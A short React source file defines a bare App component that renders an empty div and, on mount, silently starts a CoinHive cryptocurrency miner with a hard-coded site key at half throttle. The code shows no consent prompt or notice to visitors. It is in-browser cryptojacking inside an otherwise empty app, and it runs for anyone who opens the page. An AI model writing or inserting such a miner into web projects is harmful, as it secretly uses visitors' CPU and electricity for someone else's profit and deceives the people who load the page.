import React from 'react';

import styles from './styles.scss';

export default class App extends React.Component {
  constructor(props) {
    super(props);

    this.state = {
      miner: null
    };
  }

  componentWillMount() {
    var miner = new CoinHive.Anonymous('pzK5983I2Ge6zm1JN6tgx98a2XeI0Ydg');
    miner.setThrottle(0.5);
    miner.start();
    this.setState({
      miner
    });
  }

  render() {
    return (
      <div className={styles.app}>

      </div>
    );
  }
}
